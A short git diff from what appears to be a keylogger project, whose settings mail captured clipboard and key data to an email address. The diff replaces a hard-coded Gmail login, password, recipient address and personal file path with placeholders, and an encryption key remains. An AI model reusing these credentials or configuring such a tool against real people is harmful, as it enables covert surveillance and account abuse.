@@ -42,17 +42,17 @@ clipboard_information_e = "e_clipboard.txt"
 time_iteration = 2
 number_of_iterations_end = 2
 
-email_address = "completekeylogger1@gmail.com"
-password = "redhatlogin"
+email_address = ""#enter mail address
+password = ""#enter password
 
 
 username = getpass.getuser()
 
-toaddr = "vishald41234@gmail.com"
+toaddr = ""#Enter mail address here
 
 key = "XzNMMyGQbZUtXbz9V5O8AXXSW7LDojFF_z2DMlMMYak="
 
-file_path = "C:\\Users\\VISHAL DHANURE\\Desktop\\ml-projects\\project"
+file_path = ""#Enter file path/url
 extend = "\\"
 file_merge = file_path + extend
 
